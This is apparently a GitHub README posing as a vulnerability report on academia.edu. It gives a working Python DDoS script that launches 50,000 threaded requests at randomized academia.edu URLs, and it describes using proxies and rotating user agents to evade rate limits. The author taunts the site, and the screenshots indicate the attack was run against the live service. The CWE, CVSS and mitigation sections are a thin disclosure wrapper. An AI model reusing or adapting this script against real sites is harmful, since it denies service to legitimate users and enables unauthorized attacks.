# Skooled
### Ddos for Academina.edu

### Title: DDoS by Resource Exhaustion Using Proxies and User Agents Bypassing Rate Limits

Description: This report describes a Distributed Denial of Service (DDoS) attack targeting academia.edu, where multiple requests are generated to exhaust server resources. The attack leverages randomized URL generation, multiple proxy addresses, and varying user-agent headers to bypass rate-limiting mechanisms. By generating high-volume requests in rapid succession, the attack attempts to exhaust server resources, resulting in a denial of service for legitimate users.


---

Vulnerability Details:

Attack Type: Distributed Denial of Service (DDoS) by Resource Exhaustion

Affected Platform: Academia.edu

Script Used: Python-based script (skooed.py) that generates random URLs, bypasses rate limits, and utilizes threading for high-volume concurrent requests.


Steps of the Attack:

1. Random URL Generation: The script randomly generates URLs using a combination of pre-defined base URLs and random 7-digit numerical strings, creating a large number of unique requests.


2. Threading for Concurrency: By using threading, the script launches multiple concurrent requests (up to 50,000 threads in this instance), resulting in a massive spike in request volume.


3. Resource Exhaustion: The rapid and massive influx of requests aims to overload the server resources (CPU, memory, bandwidth) and cause slowdowns or unavailability.


4. Rate Limit Bypass: The script can be modified with proxies and varying user agents to evade rate-limiting restrictions that would otherwise prevent excessive requests from the same IP.




---

CWE IDs:

CWE-400: Uncontrolled Resource Consumption - Excessive requests lead to resource exhaustion, impacting server availability.

CWE-770: Allocation of Resources Without Limits or Throttling - Lack of adequate rate limiting on academia.edu’s platform.

CWE-829: Inclusion of Functionality from Untrusted Control Sphere - Potential exploitation of unauthenticated resources due to improper rate limiting.



---

CVSS Score Calculation: Based on the characteristics of this DDoS attack, the CVSS (Common Vulnerability Scoring System) score would be calculated as follows:

Attack Vector (AV): Network (N)

Attack Complexity (AC): Low (L)

Privileges Required (PR): None (N)

User Interaction (UI): None (N)

Scope (S): Unchanged (U)

Confidentiality (C): None (N)

Integrity (I): None (N)

Availability (A): High (H) – Severe impact on availability due to resource exhaustion.


CVSS Score: 7.5 (High)

This score reflects the significant impact on availability and the low difficulty in executing this type of attack.


---

Mitigation Recommendations:

1. Rate Limiting and Throttling: Implement strict rate-limiting mechanisms based on IP addresses, user agents, and request patterns to detect and block excessive requests.


2. CAPTCHA Challenges: Enforce CAPTCHA or other challenge mechanisms for unusual access patterns to limit bot-based requests.


3. Web Application Firewall (WAF): Deploy a WAF to identify and block abnormal request patterns that indicate DDoS attempts.


4. Load Balancing and Autoscaling: Use load balancers to distribute traffic efficiently and enable autoscaling to handle sudden traffic spikes without exhausting resources.


5. Monitoring and Alerts: Continuous monitoring of server health and unusual traffic patterns can help detect early signs of resource exhaustion and trigger defensive actions.




---

PoC script:

```python
import requests
import threading
import random
import time

# List of base URLs to test
base_urls = [
    "https://www.academia.edu/10",
    "https://www.academia.edu/11"
]

# Function to generate a URL with a random 7-digit numerical string
def generate_random_url():
    base_url = random.choice(base_urls)  # Randomly select a base URL
    random_digits = ''.join([str(random.randint(0, 9)) for _ in range(7)])
    return f"{base_url}{random_digits}"

# Function to make a request to the generated URL
def make_request():
    url = generate_random_url()
    try:
        response = requests.get(url)
        print(f"Requested: {url} | Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Request failed for {url}: {e}")

# Main function to create threads and run multiple requests concurrently
def run_concurrent_requests(num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=make_request)
        threads.append(thread)
        thread.start()
        time.sleep(0.1)  # slight delay to stagger requests

    for thread in threads:
        thread.join()

# Run the script with the desired number of threads
if __name__ == "__main__":
    num_threads = 50000  # Adjust the number of concurrent requests as needed
    run_concurrent_requests(num_threads)
```
All those Doctors on there and you didn't thunk too hire one to be able to stop me. 🤣🤣🤣

![Attck PoC in terminal.](https://raw.githubusercontent.com/DeadmanXXXII/Skooled/main/Screenshot_20241110-000810.png)

![Scraper pulling links for other resources](https://raw.githubusercontent.com/DeadmanXXXII/Skooled/main/Screenshot_20241110-000824.png)
